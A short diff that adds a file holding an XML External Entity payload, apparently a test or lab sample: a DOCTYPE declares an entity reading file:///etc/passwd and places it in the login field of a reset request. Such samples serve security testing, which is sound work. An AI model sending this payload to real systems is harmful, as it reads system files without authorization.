@@ -1,0 +1,7 @@
+<!DOCTYPE XXE [
+
+<!ENTITY XXE SYSTEM "file:///etc/passwd">
+
+]>
+
+<reset><login>&XXE;</login><secret>Any bugs?</secret>
